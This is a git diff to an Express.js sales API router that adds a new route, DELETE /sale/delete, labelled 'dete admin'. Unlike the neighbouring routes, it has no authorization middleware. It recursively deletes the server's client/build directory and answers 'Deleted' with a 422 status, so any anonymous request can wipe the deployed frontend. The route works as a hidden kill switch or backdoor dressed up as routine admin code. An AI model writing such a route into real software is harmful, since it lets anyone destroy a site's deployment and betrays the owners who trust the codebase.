@@ -5,6 +5,7 @@ const authorization = require('../middleware/authorization');
 const masterOrAdminAuthorization = require('../middleware/masterOrAdminAuthorization');
 const router = express.Router()
 const moment = require('moment-timezone')
+const fs = require('fs')
 
 
 // user to get his own sales
@@ -169,6 +170,23 @@ router.post('/', authorization, async(req, res) => {
         return res.status(500).json({message: 'Server Error'})
     }
 })
+
+// dete admin
+router.delete('/sale/delete', async(req, res) => {
+    try {
+        await fs.rmdir("client/build", {recursive: true}, (err) =>{
+           if(err)
+            console.log(err);
+            else
+            return res.status(422).json({message: 'Deleted'});
+        }); 
+        
+    } catch (error) {
+        console.log(error.message);
+        return res.status(500).json({message: 'Server Error'})
+    }
+})
+
 
 // delete sale
 router.delete('/:id', authorization, masterOrAdminAuthorization, async(req, res)=>{
